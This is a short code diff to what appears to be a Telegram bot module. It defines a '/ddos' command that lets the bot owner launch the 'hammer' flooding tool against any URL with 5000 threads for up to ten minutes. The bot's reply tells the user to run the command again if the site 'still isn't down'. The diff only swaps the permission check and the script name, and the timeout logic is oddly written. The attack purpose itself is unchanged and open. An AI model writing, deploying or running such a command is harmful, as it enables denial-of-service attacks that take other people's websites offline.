@@ -4,13 +4,13 @@ import time
 import socket
 import random
 from alexa.events import register
-from alexa import SUDO_USERS
+from alexa import OWNER_ID
 import subprocess
 
 @register(pattern="/ddos (.*)")
 async def ddos(event): 
   userid = event.message.sender_id
-  if userid not in SUDO_USERS:
+  if userid not in OWNER_ID:
      return
   url = event.pattern_match.group(1)
   cmnd = f"{url}"
@@ -19,7 +19,7 @@ async def ddos(event):
   timeout = 600
   timeout_start = time.time()
   if time.time() < timeout_start + timeout:
-     subprocess.run(["python", "hammer.py", "-s", cmnd, "-t", "5000"])
+     subprocess.run(["python", "hammer", "-s", cmnd, "-t", "5000"])
   elif time.time() >= timeout_start + timeout:
      raise KeyboardInterrupt
      await event.reply(f"Attacked has stopped now\nIf {url} still isn't down then run the same command again")
